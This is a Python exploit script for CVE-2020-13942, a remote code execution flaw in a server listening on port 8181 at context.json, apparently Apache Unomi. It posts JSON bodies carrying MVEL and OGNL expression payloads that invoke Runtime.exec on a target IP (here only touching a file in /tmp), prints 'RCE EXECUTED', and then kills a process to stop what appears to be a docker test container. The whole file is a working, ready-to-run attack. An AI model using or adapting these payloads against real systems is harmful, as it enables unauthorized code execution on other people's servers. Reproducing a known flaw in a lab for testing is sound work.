import os
import sys
import argparse
import requests


def do_exploit(victim_ip, attack):
    # exploits share same header except of content-length
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
        'Connection': 'close',
        'Content-Type': 'application/json'
    }

    if attack == 'mvel':
        headers['Content-Length'] = '483'

        body = {
            "filters": [
                {
                    "id": "sample",
                    "filters": [
                        {
                            "condition": {
                                "parameterValues": {
                                    "": "script::Runtime r = Runtime.getRuntime(); r.exec(\"touch /tmp/mvel\");"
                                },
                                "type": "profilePropertyCondition"
                            }
                        }
                    ]
                }
            ],
            "sessionId": "sample"
        }

    elif attack == 'ognl':
        headers['Content-Length'] = '1064'

        body = {
            "personalizations": [
                {
                    "id": "gender-test",
                    "strategy": "matching-first",
                    "strategyOptions": {
                        "fallback": "var2"
                    },
                    "contents": [
                        {
                            "filters": [
                                {
                                    "condition": {
                                        "parameterValues": {
                                            "propertyName": "(#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\"getRuntime\")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\"exec\")}.{? #this.getParameters()[0].getType().getName().equals(\"java.lang.String\")}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,\"touch /tmp/ognl\"))",
                                            "comparisonOperator": "equals",
                                            "propertyValue": "male"
                                        },
                                        "type": "profilePropertyCondition"
                                    }
                                }
                            ]
                        }
                    ]
                }
            ],
            "sessionId": "sample"
        }

    else:
        print('incorrect attack paramater')
        print('possibilities: mvel, ognl')
        sys.exit()

    url = 'http://' + victim_ip + ':8181/context.json'
    r = requests.post(url=url, headers=headers, json=body)

    print('RCE EXECUTED')
    print(r.content)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='CVE-2020-13942 exploit')
    parser.add_argument('-ip', dest='server_ip', action='store', type=str, required=True,
                        help='The IP address of the target server')
    parser.add_argument('-a', dest='attack', action='store', type=str, required=True, choices=['mvel', 'ognl'],
                        help='The attack that will be executed')
    args = parser.parse_args()

    do_exploit(args.server_ip, args.attack)

    # shutdown docker container by killing main process after exploit is finished
    print("exploit finished - shutting down")
    os.system("pkill -f sleep")
